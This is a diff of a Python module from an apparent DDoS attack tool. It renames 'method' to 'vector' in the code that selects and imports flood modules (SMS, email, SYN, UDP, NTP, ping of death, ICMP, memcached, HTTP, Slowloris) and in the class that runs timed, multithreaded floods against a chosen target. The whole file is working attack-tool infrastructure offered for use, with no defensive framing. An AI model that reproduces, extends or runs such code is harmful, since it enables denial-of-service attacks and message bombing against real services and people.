@@ -5,33 +5,33 @@ from humanfriendly import format_timespan, Spinner
 from tools.crash import CriticalError
 from tools.ipTools import GetTargetAddress, InternetConnectionCheck
 
-""" Find & import ddos method """
+""" Find & import ddos vector """
 
-def GetMethodByName(method):
-    if method == "SMS":
+def GetvectorByName(vector):
+    if vector == "SMS":
         dir = "tools.SMS.main"
-    elif method == "EMAIL":
+    elif vector == "EMAIL":
         dir = "tools.EMAIL.main"
-    elif method in ("SYN", "UDP", "NTP", "POD", "ICMP", "MEMCACHED"):
-        dir = f"tools.L4.{method.lower()}"
-    elif method in ("HTTP", "SLOWLORIS"):
-        dir = f"tools.L7.{method.lower()}"
+    elif vector in ("SYN", "UDP", "NTP", "POD", "ICMP", "MEMCACHED"):
+        dir = f"tools.L4.{vector.lower()}"
+    elif vector in ("HTTP", "SLOWLORIS"):
+        dir = f"tools.L7.{vector.lower()}"
     else:
         raise SystemExit(
-            f"{Fore.RED}[!] {Fore.MAGENTA}Unknown ddos method {repr(method)} selected..{Fore.RESET}"
+            f"{Fore.RED}[!] {Fore.MAGENTA}Unknown DDoS vector {repr(vector)} selected..{Fore.RESET}"
         )
     module = __import__(dir, fromlist=["object"])
     if hasattr(module, "flood"):
-        method = getattr(module, "flood")
-        return method
+        vector = getattr(module, "flood")
+        return vector
     else:
         CriticalError(
-            f"Method 'flood' not found in {repr(dir)}. Please use python 3", "-"
+            f"vector 'flood' not found in {repr(dir)}. Please use python 3", "-"
         )
 
-""" Class to control attack methods """
+""" Class to control attack vectors """
 
-class AttackMethod:
+class Attackvector:
     # Constructor
     def __init__(self, name, duration, threads, target):
         self.name = name
@@ -44,7 +44,7 @@ class AttackMethod:
     # Enter
     def __enter__(self):
         InternetConnectionCheck()
-        self.method = GetMethodByName(self.name)
+        self.vector = GetvectorByName(self.name)
         self.target = GetTargetAddress(self.target_name, self.name)
         return self
     # Exit
@@ -61,7 +61,7 @@ class AttackMethod:
     # Run flooder
     def __RunFlood(self):
         while self.is_running:
-            self.method(self.target)
+            self.vector(self.target)
     # Start threads
     def __RunThreads(self):
         # Run timer thread
@@ -96,7 +96,7 @@ class AttackMethod:
             target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
         print(
-            f"{Fore.MAGENTA}[?] {Fore.BLUE}Starting attack to {target} using method {self.name}.{Fore.RESET}\n"
+            f"{Fore.MAGENTA}[?] {Fore.BLUE}Starting attack to {target} using vector {self.name}.{Fore.RESET}\n"
             f"{Fore.MAGENTA}[?] {Fore.BLUE}Attack will be stopped after {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
         )
         self.is_running = True
